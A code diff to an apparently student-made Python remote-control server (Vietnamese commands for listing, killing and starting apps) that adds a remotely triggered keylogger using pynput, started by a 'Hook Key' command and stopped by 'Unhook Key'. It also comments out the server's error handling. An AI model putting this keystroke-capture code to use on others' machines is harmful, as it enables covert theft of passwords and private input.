@@ -71,26 +71,59 @@ def Server_Running():
             return 1
         except:
             return 0
+    def hook():
+        from threading import Thread
+        import threading
+        import pynput
+        import time
+        from pynput.keyboard import Key, Listener
+        keys = []
+        KeyStop = True
+        def Stop():
+            while True:
+                nonlocal KeyStop
+                check = client.recv(1024).decode("utf8")
+                print(check)
+                if check == "Unhook Key": 
+                    client.sendall(bytes("OK","utf8"))
+                    KeyStop = False
+                    break
+        t1 = threading.Thread(target=Stop)
+        def KeyLogger():
+            def on_press(key):
+                print(KeyStop)
+                if KeyStop == False: listener.stop()
+                nonlocal keys
+                keys.append(key)
+
+            with Listener(on_press = on_press) as listener:
+                listener.join()
+            for i in keys:
+                print(i)
+        t2 = threading.Thread(target=KeyLogger)
+        t1.start()
+        t2.start()
 
     #Command cho server:
     while True:
-        try:
-            def Command_catch(i):
-                if i == "Xem App": App_running(HOST,PORT)
-                elif i == "Xoa App": 
-                    ID_App = client.recv(1024).decode("utf8") 
-                    App_running_kill(ID_App)
-                elif i == "Bat App":
-                    Name = client.recv(1024).decode("utf8")
-                    App_start(Name)
+        #try:
+        def Command_catch(i):
+            if i == "Xem App": App_running(HOST,PORT)
+            elif i == "Xoa App": 
+                ID_App = client.recv(1024).decode("utf8") 
+                App_running_kill(ID_App)
+            elif i == "Bat App":
+                Name = client.recv(1024).decode("utf8")
+                App_start(Name)
+            elif i == "Hook Key": hook()
 
-            Command = client.recv(1024).decode("utf8")
-            client.sendall(bytes("OK","utf8"))
-            print(Command)
-            Command_catch(Command)
-        except:
-            print("Disconnected")
-            break
+        Command = client.recv(1024).decode("utf8")
+        client.sendall(bytes("OK","utf8"))
+        print(Command)
+        Command_catch(Command)
+        #except:
+            #print("Disconnected")
+            #break
     server.close()
     
 from tkinter import *
